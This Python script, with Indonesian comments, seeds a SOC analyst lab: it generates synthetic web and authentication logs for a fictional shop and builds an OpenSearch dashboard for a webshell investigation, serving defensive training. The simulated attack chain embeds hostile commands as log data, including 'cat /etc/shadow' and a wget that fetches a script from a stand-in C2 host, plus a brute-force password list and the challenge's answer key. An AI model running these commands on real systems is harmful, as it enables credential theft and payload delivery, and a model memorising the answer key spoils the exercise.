#!/usr/bin/env python3
"""
SOC Lab - Webshell Hunt : seeder.
Men-generate + ingest data dummy ke OpenSearch, lalu membuat index pattern &
default time range di OpenSearch Dashboards. Hanya pakai standard library.

Env:
  OPENSEARCH_URL   (default http://localhost:9200)
  DASHBOARDS_URL   (default http://localhost:5601)
  EVENT_COUNT      (default 9000)                     # jumlah event traffic normal (noise)
  SCENARIO_DAY     (default 2026-10-10)               # tanggal insiden (UTC)
"""
import base64
import datetime as dt
import json
import os
import random
import re
import sys
import time
import urllib.request
import urllib.error

# ----------------------------------------------------------------------------
# KONFIGURASI
# ----------------------------------------------------------------------------
OPENSEARCH_URL = os.environ.get("OPENSEARCH_URL", "http://localhost:9200").rstrip("/")
DASHBOARDS_URL = os.environ.get("DASHBOARDS_URL", "http://localhost:5601").rstrip("/")
N_NORMAL_WEB = int(os.environ.get("EVENT_COUNT", "9000"))
SCENARIO_DAY = os.environ.get("SCENARIO_DAY", "2026-10-10")
SEED = int(os.environ.get("SEED", "1337"))

WEB_INDEX = "nusacommerce-web-access"
AUTH_INDEX = "nusacommerce-auth"
OS_VERSION_FOR_PANEL = "2.19.1"  # versi di metadata panel dashboard

# KUNCI JAWABAN skenario
ATTACKER_IP = "203.0.113.66"
ATTACKER_UA = "python-requests/2.31.0"
WEBSHELL_PATH = "/uploads/2026/10/produk-promo.php"
UPLOAD_ENDPOINT = "/admin/media/upload.php"
COMPROMISED_USER = "admin"
C2_URL = "http://203.0.113.66/x.sh"

random.seed(SEED)


def log(*a):
    print("[seed]", *a, flush=True)


# ----------------------------------------------------------------------------
# DATA PENDUKUNG
# ----------------------------------------------------------------------------
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]
BOT_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]
HOSTS = ["web-01", "web-02"]

NORMAL_PAGES = [
    ("/", 14), ("/index.php", 8), ("/products.php", 10), ("/product.php", 16),
    ("/cart.php", 6), ("/checkout.php", 3), ("/login.php", 5), ("/register.php", 2),
    ("/about.php", 2), ("/contact.php", 2), ("/api/products", 7), ("/api/cart", 4),
    ("/css/style.css", 9), ("/js/app.js", 9), ("/js/vendor.js", 5),
    ("/images/logo.png", 7), ("/images/banner.jpg", 6), ("/images/product-01.jpg", 5),
    ("/images/product-02.jpg", 5), ("/favicon.ico", 6), ("/robots.txt", 1),
]

GEO = {}


def _geo(ip, cc, name):
    GEO[ip] = (cc, name)
    return ip


INTERNAL_IPS = [_geo(f"10.10.5.{i}", "ID", "Indonesia") for i in range(10, 40)]
ADMIN_LEGIT_IP = _geo("10.10.5.12", "ID", "Indonesia")
CUSTOMER_IPS = []
for _ in range(80):
    CUSTOMER_IPS.append(_geo(
        "{}.{}.{}.{}".format(random.choice([103, 114, 36, 180, 182, 202, 118, 125]),
                             random.randint(0, 255), random.randint(0, 255), random.randint(1, 254)),
        "ID", "Indonesia"))

_geo(ATTACKER_IP, "RU", "Russia")
DECOY_SCANNER_IP = _geo("198.51.100.23", "NL", "Netherlands")
DECOY_UPLOAD_IP = _geo("192.0.2.77", "CN", "China")
NIKTO_IP = _geo("198.51.100.200", "US", "United States")


def day_dt(h, m, s=0, micro=0):
    y, mo, d = (int(x) for x in SCENARIO_DAY.split("-"))
    return dt.datetime(y, mo, d, h, m, s, micro, tzinfo=dt.timezone.utc)


def iso(d):
    return d.strftime("%Y-%m-%dT%H:%M:%S.") + f"{int(d.microsecond/1000):03d}Z"


def ext_of(path):
    base = path.split("?")[0]
    if "." in base.rsplit("/", 1)[-1]:
        return base.rsplit(".", 1)[-1].lower()
    return ""


def web_doc(ts, ip, method, path, status, ua, user="-", req_bytes=0, resp_bytes=None, query="", referrer="-"):
    cc, cn = GEO.get(ip, ("ID", "Indonesia"))
    if resp_bytes is None:
        resp_bytes = random.randint(200, 6000) if status == 200 else random.randint(0, 600)
    return {
        "@timestamp": iso(ts),
        "event": {"module": "nginx", "dataset": "nginx.access", "category": "web", "kind": "event"},
        "source": {"ip": ip, "geo": {"country_iso_code": cc, "country_name": cn}},
        "host": {"name": random.choice(HOSTS)},
        "http": {"request": {"method": method, "body": {"bytes": req_bytes}, "referrer": referrer},
                 "response": {"status_code": status, "body": {"bytes": resp_bytes}}},
        "url": {"original": path + (("?" + query) if query else ""), "path": path,
                "query": query, "extension": ext_of(path)},
        "user_agent": {"original": ua},
        "user": {"name": user},
    }


def auth_doc(ts, ip, user, action, outcome, message, service="web-admin"):
    cc, cn = GEO.get(ip, ("ID", "Indonesia"))
    return {
        "@timestamp": iso(ts),
        "event": {"category": "authentication", "action": action, "outcome": outcome, "kind": "event"},
        "source": {"ip": ip, "geo": {"country_iso_code": cc, "country_name": cn}},
        "user": {"name": user}, "service": {"name": service}, "host": {"name": random.choice(HOSTS)},
        "authentication": {"method": "password"}, "message": message,
    }


# ----------------------------------------------------------------------------
# TRAFFIC NORMAL + NOISE + RED HERRING
# ----------------------------------------------------------------------------
def gen_normal_web(docs):
    pages, weights = zip(*NORMAL_PAGES)
    for _ in range(N_NORMAL_WEB):
        hour = random.choices(range(24), weights=[1, 1, 1, 1, 1, 2, 3, 5, 7, 9, 10, 11, 12, 11, 10, 9, 9, 10, 12, 13, 11, 8, 5, 3])[0]
        ts = day_dt(hour, random.randint(0, 59), random.randint(0, 59), random.randint(0, 999) * 1000)
        ip = random.choice(CUSTOMER_IPS + INTERNAL_IPS)
        path = random.choices(pages, weights=weights)[0]
        query, method = "", "GET"
        if path == "/product.php":
            query = "id=" + str(random.randint(1, 240))
        if path in ("/cart.php", "/checkout.php", "/login.php", "/register.php", "/api/cart") and random.random() < 0.4:
            method = "POST"
        status = random.choices([200, 304, 301, 404, 500], weights=[86, 8, 2, 3, 1])[0]
        ua = random.choice(BROWSER_UAS * 6 + BOT_UAS)
        docs.append(web_doc(ts, ip, method, path, status, ua, query=query,
                            referrer="https://shop.nusacommerce.local/" if random.random() < 0.5 else "-"))


def gen_normal_auth(docs):
    for _ in range(70):
        hour = random.choices(range(7, 22), weights=[2, 4, 6, 8, 9, 9, 8, 7, 7, 8, 9, 8, 6, 4, 3])[0]
        ts = day_dt(hour, random.randint(0, 59), random.randint(0, 59))
        ip = random.choice(INTERNAL_IPS)
        user = random.choice(["admin", "budi.staff", "sari.cs", "operator1", "gudang"])
        if random.random() < 0.12:
            docs.append(auth_doc(ts, ip, user, "login_failed", "failure", f"Failed password for {user} (wrong password)"))
        else:
            docs.append(auth_doc(ts, ip, user, "login_success", "success", f"Accepted password for {user}"))


def gen_decoy_webshell_scanner(web):
    names = ["/shell.php", "/c99.php", "/r57.php", "/wso.php", "/b374k.php", "/cmd.php", "/up.php",
             "/uploads/shell.php", "/images/shell.php", "/admin/shell.php", "/backdoor.php", "/alfa.php", "/mini.php"]
    t = day_dt(3, 11, 0)
    for n in names:
        t += dt.timedelta(seconds=random.randint(2, 9))
        web.append(web_doc(t, DECOY_SCANNER_IP, "GET", n, 404,
                          "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
                          query="cmd=id" if random.random() < 0.5 else ""))


def gen_decoy_failed_upload(web, auth):
    t = day_dt(11, 48, 0)
    auth.append(auth_doc(t, DECOY_UPLOAD_IP, "admin", "login_failed", "failure", "Failed password for admin (wrong password)"))
    for _ in range(4):
        t += dt.timedelta(seconds=random.randint(5, 20))
        web.append(web_doc(t, DECOY_UPLOAD_IP, "POST", UPLOAD_ENDPOINT, 403, ATTACKER_UA,
                          req_bytes=random.randint(1800, 5200), resp_bytes=421))


def gen_nikto_noise(web):
    paths = ["/phpinfo.php", "/test.php", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/",
             "/server-status", "/config.php.bak", "/backup.zip", "/admin/", "/.htaccess", "/web.config",
             "/console", "/xmlrpc.php", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/test.cgi"]
    t = day_dt(2, 5, 0)
    for _ in range(220):
        t += dt.timedelta(seconds=random.randint(1, 4))
        status = random.choices([404, 403, 200, 301], weights=[80, 10, 5, 5])[0]
        web.append(web_doc(t, NIKTO_IP, random.choice(["GET", "HEAD"]), random.choice(paths), status,
                          "Mozilla/5.0 (compatible; Nikto/2.5.0)"))


def gen_legit_admin_upload(web, auth):
    t = day_dt(13, 20, 0)
    auth.append(auth_doc(t, ADMIN_LEGIT_IP, "admin", "login_success", "success", "Accepted password for admin"))
    web.append(web_doc(t + dt.timedelta(seconds=3), ADMIN_LEGIT_IP, "GET", "/admin/dashboard.php", 200, BROWSER_UAS[0], user="admin"))
    web.append(web_doc(t + dt.timedelta(minutes=2), ADMIN_LEGIT_IP, "POST", UPLOAD_ENDPOINT, 200, BROWSER_UAS[0], user="admin", req_bytes=184320, resp_bytes=512))
    web.append(web_doc(t + dt.timedelta(minutes=3), ADMIN_LEGIT_IP, "GET", "/uploads/2026/10/banner-lebaran.jpg", 200, BROWSER_UAS[0], user="admin", resp_bytes=184001))


# ----------------------------------------------------------------------------
# RANTAI SERANGAN (KUNCI JAWABAN)
# ----------------------------------------------------------------------------
def gen_attack_chain(web, auth):
    ip, ua = ATTACKER_IP, ATTACKER_UA

    # Fase 1: Recon
    recon = [("GET", "/robots.txt", 200, ""), ("GET", "/.git/config", 404, ""),
             ("GET", "/wp-login.php", 404, ""), ("GET", "/phpmyadmin/", 404, ""),
             ("GET", "/admin", 301, ""), ("GET", "/admin/login.php", 200, ""),
             ("GET", "/server-status", 403, ""), ("GET", "/config.php.bak", 404, ""),
             ("GET", "/admin/media/", 403, ""), ("GET", UPLOAD_ENDPOINT, 200, "")]
    t = day_dt(9, 2, 0)
    for method, path, status, q in recon:
        t += dt.timedelta(seconds=random.randint(20, 55))
        web.append(web_doc(t, ip, method, path, status, ua, query=q))

    # Fase 2: Brute-force admin (TEPAT 15 percobaan gagal)
    t = day_dt(9, 15, 0)
    pwlist = ["admin", "password", "123456", "admin123", "root", "P@ssw0rd", "nusacommerce",
              "qwerty", "letmein", "welcome1", "shop2024", "admin@123", "changeme", "test123", "pass123"]
    for _pw in pwlist:
        t += dt.timedelta(seconds=random.randint(4, 14))
        web.append(web_doc(t, ip, "POST", "/admin/login.php", 200, ua, req_bytes=random.randint(90, 140)))
        auth.append(auth_doc(t, ip, COMPROMISED_USER, "login_failed", "failure",
                            f"Failed password for {COMPROMISED_USER} (invalid credentials)"))

    # Fase 3: Login BERHASIL 09:22:11
    t = day_dt(9, 22, 11)
    auth.append(auth_doc(t, ip, COMPROMISED_USER, "login_success", "success",
                        f"Accepted password for {COMPROMISED_USER} after 15 failed attempts"))
    web.append(web_doc(t, ip, "POST", "/admin/login.php", 302, ua, req_bytes=128, resp_bytes=0))
    web.append(web_doc(t + dt.timedelta(seconds=2), ip, "GET", "/admin/dashboard.php", 200, ua, user="admin"))

    # Fase 4: Upload webshell
    t = day_dt(9, 26, 40)
    web.append(web_doc(t, ip, "GET", UPLOAD_ENDPOINT, 200, ua, user="admin"))
    web.append(web_doc(t + dt.timedelta(seconds=7), ip, "POST", UPLOAD_ENDPOINT, 200, ua, user="admin", req_bytes=4821, resp_bytes=318))

    # Fase 5: Eksekusi webshell (perintah PERTAMA = id, pukul 09:28)
    cmds = [("id", 240), ("whoami", 190), ("uname+-a", 420), ("pwd", 180),
            ("ls+-la+/var/www/html", 2100), ("cat+/etc/passwd", 3200),
            ("cat+/var/www/html/config.php", 1450), ("netstat+-antp", 5400), ("ps+aux", 8800),
            ("which+python+perl+nc", 160),
            (f"wget+{C2_URL}+-O+/tmp/x.sh", 90), ("crontab+-l", 110), ("cat+/etc/shadow", 40)]
    t = day_dt(9, 28, 5)
    for c, rb in cmds:
        t += dt.timedelta(seconds=random.randint(25, 120))
        web.append(web_doc(t, ip, "GET", WEBSHELL_PATH, 200, ua, query="cmd=" + c, resp_bytes=rb))
    for _ in range(3):
        t += dt.timedelta(seconds=random.randint(30, 90))
        web.append(web_doc(t, ip, "POST", WEBSHELL_PATH, 200, ua, req_bytes=random.randint(600, 9000), resp_bytes=random.randint(100, 900)))

    # Fase 6: persistence (akses ulang)
    for h, m in [(14, 7), (18, 33), (21, 2)]:
        t = day_dt(h, m, random.randint(0, 59))
        web.append(web_doc(t, ip, "GET", WEBSHELL_PATH, 200, ua,
                          query="cmd=" + random.choice(["id", "uptime", "ls+/tmp"]), resp_bytes=random.randint(150, 600)))


# ----------------------------------------------------------------------------
# MAPPING
# ----------------------------------------------------------------------------
WEB_MAPPING = {
    "settings": {"index": {"number_of_shards": 1, "number_of_replicas": 0}},
    "mappings": {"properties": {
        "@timestamp": {"type": "date"},
        "event": {"properties": {"module": {"type": "keyword"}, "dataset": {"type": "keyword"}, "category": {"type": "keyword"}, "kind": {"type": "keyword"}}},
        "source": {"properties": {"ip": {"type": "ip"}, "geo": {"properties": {"country_iso_code": {"type": "keyword"}, "country_name": {"type": "keyword"}}}}},
        "host": {"properties": {"name": {"type": "keyword"}}},
        "http": {"properties": {
            "request": {"properties": {"method": {"type": "keyword"}, "body": {"properties": {"bytes": {"type": "long"}}}, "referrer": {"type": "keyword"}}},
            "response": {"properties": {"status_code": {"type": "integer"}, "body": {"properties": {"bytes": {"type": "long"}}}}}}},
        "url": {"properties": {"original": {"type": "keyword"}, "path": {"type": "keyword"}, "query": {"type": "keyword"}, "extension": {"type": "keyword"}}},
        "user_agent": {"properties": {"original": {"type": "keyword"}}},
        "user": {"properties": {"name": {"type": "keyword"}}},
    }},
}
AUTH_MAPPING = {
    "settings": {"index": {"number_of_shards": 1, "number_of_replicas": 0}},
    "mappings": {"properties": {
        "@timestamp": {"type": "date"},
        "event": {"properties": {"category": {"type": "keyword"}, "action": {"type": "keyword"}, "outcome": {"type": "keyword"}, "kind": {"type": "keyword"}}},
        "source": {"properties": {"ip": {"type": "ip"}, "geo": {"properties": {"country_iso_code": {"type": "keyword"}, "country_name": {"type": "keyword"}}}}},
        "user": {"properties": {"name": {"type": "keyword"}}},
        "service": {"properties": {"name": {"type": "keyword"}}},
        "host": {"properties": {"name": {"type": "keyword"}}},
        "authentication": {"properties": {"method": {"type": "keyword"}}},
        "message": {"type": "text", "fields": {"keyword": {"type": "keyword", "ignore_above": 1024}}},
    }},
}


# ----------------------------------------------------------------------------
# HTTP HELPERS
# ----------------------------------------------------------------------------
_BASIC_AUTH = os.environ.get("BASIC_AUTH", "")  # "user:pass" -> header Authorization
_AUTH_HEADER = ("Basic " + base64.b64encode(_BASIC_AUTH.encode()).decode()) if _BASIC_AUTH else None


def req(method, url, data=None, ctype="application/json", extra_headers=None, timeout=120):
    headers = {"Content-Type": ctype}
    if _AUTH_HEADER:
        headers["Authorization"] = _AUTH_HEADER
    if extra_headers:
        headers.update(extra_headers)
    body = data.encode() if isinstance(data, str) else data
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:  # noqa
        return 0, str(e)


def wait_opensearch():
    log(f"menunggu OpenSearch di {OPENSEARCH_URL} ...")
    for _ in range(90):
        code, _ = req("GET", f"{OPENSEARCH_URL}/_cluster/health", timeout=5)
        if code == 200:
            log("OpenSearch siap.")
            return True
        time.sleep(2)
    log("ERROR: OpenSearch tidak siap.")
    return False


def harden_security():
    """Petakan user anonymous -> role READ-ONLY lewat Security REST API (sbg admin).
    Dijalankan tiap start (idempoten via PUT). Anonymous dapat:
      - readall        : baca semua index (termasuk data nusacommerce-*)
      - kibana_user    : akses saved object/tenant (agar dashboard bisa DILIHAT)
      - kibana_read_only : penanda read-only mode di Dashboards (blok tulis/edit/hapus)
    Tulis ke data index tetap ditolak (readall hanya baca); tulis .kibana ditolak readonly_mode.
    """
    anon = "opendistro_security_anonymous_backendrole"
    api = f"{OPENSEARCH_URL}/_plugins/_security/api"
    # Role read-only: baca data + baca saved object Global tenant, TANPA izin tulis apa pun.
    role = {
        "cluster_permissions": ["cluster_composite_ops_ro", "cluster:monitor/*"],
        "index_permissions": [
            {"index_patterns": ["nusacommerce-*"],
             "allowed_actions": ["read", "indices:data/read/*", "indices:monitor/*",
                                 "indices:admin/mappings/get", "indices:admin/mappings/fields/get*",
                                 "indices:admin/get", "indices:admin/aliases/get", "indices:admin/resolve/index"]},
            {"index_patterns": [".kibana", ".kibana_*", ".opensearch_dashboards", ".opensearch_dashboards_*"],
             "allowed_actions": ["read", "indices:data/read/*", "indices:admin/mappings/get",
                                 "indices:admin/get", "indices:admin/aliases/get"]},
        ],
        "tenant_permissions": [
            {"tenant_patterns": ["global_tenant"], "allowed_actions": ["kibana_all_read"]},
        ],
    }
    code, resp = req("PUT", f"{api}/roles/soc_viewer", json.dumps(role))
    log(f"  role soc_viewer: HTTP {code} {'OK' if code in (200,201) else resp[:160]}")
    for r, body in [("soc_viewer", {"backend_roles": [anon]}),
                    ("kibana_read_only", {"backend_roles": [anon]})]:
        code, resp = req("PUT", f"{api}/rolesmapping/{r}", json.dumps(body))
        log(f"  rolesmapping {r}: HTTP {code} {'OK' if code in (200,201) else resp[:160]}")


def recreate_index(name, mapping):
    req("DELETE", f"{OPENSEARCH_URL}/{name}")
    code, body = req("PUT", f"{OPENSEARCH_URL}/{name}", json.dumps(mapping))
    if code not in (200, 201):
        log(f"ERROR buat index {name}: {code} {body[:300]}")
        sys.exit(1)
    log(f"index '{name}' dibuat")


def bulk_load(name, docs, chunk=2000):
    total = 0
    for i in range(0, len(docs), chunk):
        lines = []
        for d in docs[i:i + chunk]:
            lines.append(json.dumps({"index": {"_index": name}}))
            lines.append(json.dumps(d))
        code, body = req("POST", f"{OPENSEARCH_URL}/_bulk", "\n".join(lines) + "\n", ctype="application/x-ndjson")
        if code != 200:
            log(f"ERROR bulk {code}: {body[:300]}")
            sys.exit(1)
        if '"errors":true' in body:
            log(f"WARN sebagian dokumen gagal: {body[:300]}")
        total += len(docs[i:i + chunk])
    req("POST", f"{OPENSEARCH_URL}/{name}/_refresh")
    log(f"{total} dokumen dimuat ke '{name}'")


# ----------------------------------------------------------------------------
# DASHBOARDS SAVED OBJECTS
# ----------------------------------------------------------------------------
DASHBOARD_ID = "soc-webshell-dashboard"

BRIEF_MD = (
    "## 🕵️ Operation: Silent Shell — SOC Analyst Lab\n\n"
    "Kamu **SOC Analyst** di **Nusacommerce** (toko online). Tim IT melapor server web "
    "berperilaku aneh: proses mencurigakan berjalan sebagai user web server & file asing "
    "muncul di folder `uploads`. Dugaan: **seseorang berhasil menanam web shell PHP**. "
    "Gunakan visualisasi & **Discover** untuk membongkar rantai serangannya.\n\n"
    "**Data:** `nusacommerce-web-access*` (akses web) · `nusacommerce-auth*` (login). "
    "Insiden: **10 Okt 2026 (UTC)** — time range sudah diset ke hari itu.\n\n"
    "**Tips:** pelaku sejati memenuhi SELURUH rantai — brute-force `admin` → login sukses → "
    "`POST` upload (200) → file `.php` di `/uploads/` yang dieksekusi (200) via `?cmd=`. "
    "Abaikan scanner yang hanya menghasilkan 404.\n\n"
    "### 📝 Submit jawaban (8 task) di: **https://hack.redlimit.id/soc-lab**\n"
    "_Lab ini hanya untuk investigasi/visualisasi — pengerjaan & submit task ada di platform tersebut._"
)


def _ss(query="", lang="kuery", with_index=True):
    d = {"query": {"query": query, "language": lang}, "filter": []}
    if with_index:
        d["indexRefName"] = "kibanaSavedObjectMeta.searchSourceJSON.index"
    return json.dumps(d)


def _idx_ref(index_id):
    return [{"name": "kibanaSavedObjectMeta.searchSourceJSON.index", "type": "index-pattern", "id": index_id}]


def _terms(field, size, bid="2", schema="bucket"):
    return {"id": bid, "enabled": True, "type": "terms", "schema": schema,
            "params": {"field": field, "orderBy": "1", "order": "desc", "size": size,
                       "otherBucket": False, "missingBucket": False}}


_COUNT = {"id": "1", "enabled": True, "type": "count", "schema": "metric", "params": {}}
_TABLE_PARAMS = {"perPage": 10, "showPartialRows": False, "showMetricsAtAllLevels": False,
                 "showTotal": False, "totalFunc": "sum", "percentageCol": ""}


def vs_markdown(title, md):
    return {"title": title, "type": "markdown", "aggs": [],
            "params": {"fontSize": 12, "openLinksInNewTab": True, "markdown": md}}


def vs_metric(title):
    return {"title": title, "type": "metric", "aggs": [_COUNT],
            "params": {"addTooltip": True, "addLegend": False, "type": "metric",
                       "metric": {"percentageMode": False, "useRanges": False, "colorSchema": "Green to Red",
                                  "metricColorMode": "None", "colorsRange": [{"from": 0, "to": 100000}],
                                  "labels": {"show": True}, "invertColors": False,
                                  "style": {"bgColor": False, "labelColor": False, "subText": "", "fontSize": 50}}}}


def vs_pie(title, field):
    return {"title": title, "type": "pie", "aggs": [_COUNT, _terms(field, 10, schema="segment")],
            "params": {"type": "pie", "addTooltip": True, "addLegend": True, "legendPosition": "right",
                       "isDonut": True, "labels": {"show": False, "values": True, "last_level": True, "truncate": 100}}}


def vs_histogram(title):
    return {"title": title, "type": "histogram",
            "aggs": [_COUNT, {"id": "2", "enabled": True, "type": "date_histogram", "schema": "segment",
                              "params": {"field": "@timestamp", "interval": "auto", "min_doc_count": 1}}],
            "params": {"type": "histogram", "grid": {"categoryLines": False},
                       "categoryAxes": [{"id": "CategoryAxis-1", "type": "category", "position": "bottom", "show": True,
                                         "scale": {"type": "linear"}, "labels": {"show": True, "filter": True, "truncate": 100}, "title": {}}],
                       "valueAxes": [{"id": "ValueAxis-1", "name": "LeftAxis-1", "type": "value", "position": "left", "show": True,
                                      "scale": {"type": "linear", "mode": "normal"},
                                      "labels": {"show": True, "rotate": 0, "filter": False, "truncate": 100},
                                      "title": {"text": "Jumlah event"}}],
                       "seriesParams": [{"show": True, "type": "histogram", "mode": "stacked",
                                         "data": {"label": "Count", "id": "1"}, "valueAxis": "ValueAxis-1",
                                         "drawLinesBetweenPoints": True, "lineWidth": 2, "showCircles": True}],
                       "addTooltip": True, "addLegend": False, "legendPosition": "right", "times": [], "addTimeMarker": False,
                       "labels": {"show": False}, "thresholdLine": {"show": False, "value": 10, "width": 1, "style": "full", "color": "#E7664C"}}}


def vs_table(title, bucket_fields):
    aggs = [_COUNT]
    for i, (f, size) in enumerate(bucket_fields):
        aggs.append(_terms(f, size, bid=str(i + 2)))
    return {"title": title, "type": "table", "aggs": aggs, "params": _TABLE_PARAMS}


def setup_dashboards():
    # securitytenant: global -> saved object disimpan di Global tenant (dibaca anonymous)
    hdr = {"osd-xsrf": "true", "securitytenant": "global"}
    log(f"menunggu Dashboards di {DASHBOARDS_URL} ...")
    ready = False
    for _ in range(120):
        code, _ = req("GET", f"{DASHBOARDS_URL}/api/status", extra_headers=hdr, timeout=5)
        if code == 200:
            ready = True
            break
        time.sleep(3)
    if not ready:
        log("WARN: Dashboards belum siap, lewati pembuatan saved objects.")
        return

    def post_so(so_type, sid, attributes, references=None):
        body = {"attributes": attributes}
        if references is not None:
            body["references"] = references
        code, resp = req("POST", f"{DASHBOARDS_URL}/api/saved_objects/{so_type}/{sid}?overwrite=true",
                        json.dumps(body), extra_headers=hdr)
        tag = "OK" if code in (200, 201) else ("ERR " + resp[:160])
        log(f"  {so_type}/{sid}: HTTP {code} {tag}")
        return code

    def viz(vid, vs, search_source, index_id=None):
        attr = {"title": vs["title"], "visState": json.dumps(vs), "uiStateJSON": "{}",
                "description": "", "version": 1,
                "kibanaSavedObjectMeta": {"searchSourceJSON": search_source}}
        post_so("visualization", vid, attr, _idx_ref(index_id) if index_id else [])

    # 1) index pattern
    post_so("index-pattern", WEB_INDEX, {"title": WEB_INDEX + "*", "timeFieldName": "@timestamp"})
    post_so("index-pattern", AUTH_INDEX, {"title": AUTH_INDEX + "*", "timeFieldName": "@timestamp"})

    # 2) visualisasi
    viz("v-brief", vs_markdown("Pengarahan Misi", BRIEF_MD), _ss(with_index=False))
    viz("v-total", vs_metric("Total Event Web"), _ss(), WEB_INDEX)
    viz("v-status", vs_pie("Distribusi Status Code", "http.response.status_code"), _ss(), WEB_INDEX)
    viz("v-timeline", vs_histogram("Event Web dari Waktu ke Waktu"), _ss(), WEB_INDEX)
    viz("v-topip", vs_table("Top Source IP (web)", [("source.ip", 15)]), _ss(), WEB_INDEX)
    viz("v-topurl", vs_table("Top URL Diakses", [("url.path", 20)]), _ss(), WEB_INDEX)
    viz("v-geo", vs_table("Asal Negara Source IP", [("source.geo.country_name", 12)]), _ss(), WEB_INDEX)
    viz("v-webshell",
        vs_table("⚠ File .php di /uploads yang BERHASIL (200)", [("url.original", 20), ("source.ip", 5)]),
        _ss("url.extension:php AND url.path:*uploads* AND http.response.status_code:200", lang="lucene"), WEB_INDEX)
    viz("v-authfail", vs_table("Login GAGAL per Source IP (brute-force)", [("source.ip", 10), ("user.name", 5)]),
        _ss("event.action:login_failed", lang="lucene"), AUTH_INDEX)

    # 3) dashboard (layout grid 48 kolom)
    layout = [
        ("v-brief",    0,  0, 48, 9),
        ("v-total",    0,  9, 10, 9),
        ("v-status",  10,  9, 19, 9),
        ("v-timeline",29,  9, 19, 9),
        ("v-topip",    0, 18, 24, 13),
        ("v-topurl",  24, 18, 24, 13),
        ("v-webshell", 0, 31, 30, 13),
        ("v-geo",     30, 31, 18, 13),
        ("v-authfail", 0, 44, 24, 13),
    ]
    panels, refs = [], []
    for i, (vid, x, y, w, h) in enumerate(layout, 1):
        pid = str(i)
        panels.append({"version": OS_VERSION_FOR_PANEL, "gridData": {"x": x, "y": y, "w": w, "h": h, "i": pid},
                       "panelIndex": pid, "embeddableConfig": {}, "panelRefName": f"panel_{i}"})
        refs.append({"name": f"panel_{i}", "type": "visualization", "id": vid})

    dash_attr = {
        "title": "SOC Lab — Investigasi Web Shell",
        "description": "Dashboard investigasi untuk Operation: Silent Shell.",
        "panelsJSON": json.dumps(panels),
        "optionsJSON": json.dumps({"useMargins": True, "hidePanelTitles": False}),
        "version": 1,
        "timeRestore": True, "timeTo": f"{SCENARIO_DAY}T23:59:59.999Z", "timeFrom": f"{SCENARIO_DAY}T00:00:00.000Z",
        "kibanaSavedObjectMeta": {"searchSourceJSON": json.dumps({"query": {"query": "", "language": "kuery"}, "filter": []})},
    }
    post_so("dashboard", DASHBOARD_ID, dash_attr, refs)

    # 4) default index + rentang waktu Discover
    time_default = json.dumps({"from": f"{SCENARIO_DAY}T00:00:00.000Z", "to": f"{SCENARIO_DAY}T23:59:59.999Z"})
    req("POST", f"{DASHBOARDS_URL}/api/opensearch-dashboards/settings",
        json.dumps({"changes": {"defaultIndex": WEB_INDEX, "timepicker:timeDefaults": time_default}}),
        extra_headers=hdr)
    log("dashboard + index pattern + time range siap.")


# ----------------------------------------------------------------------------
def build_all():
    web, auth = [], []
    gen_normal_web(web)
    gen_normal_auth(auth)
    gen_nikto_noise(web)
    gen_decoy_webshell_scanner(web)
    gen_decoy_failed_upload(web, auth)
    gen_legit_admin_upload(web, auth)
    gen_attack_chain(web, auth)
    web.sort(key=lambda d: d["@timestamp"])
    auth.sort(key=lambda d: d["@timestamp"])
    return web, auth


def main():
    if not wait_opensearch():
        sys.exit(1)
    if _BASIC_AUTH:
        log("mengatur akses anonymous read-only (Security REST API) ...")
        harden_security()
    log("membangun dataset ...")
    web, auth = build_all()
    log(f"web-access={len(web)} auth={len(auth)}")
    recreate_index(WEB_INDEX, WEB_MAPPING)
    recreate_index(AUTH_INDEX, AUTH_MAPPING)
    bulk_load(WEB_INDEX, web)
    bulk_load(AUTH_INDEX, auth)
    setup_dashboards()
    log("SELESAI. Lab siap.")


if __name__ == "__main__":
    main()
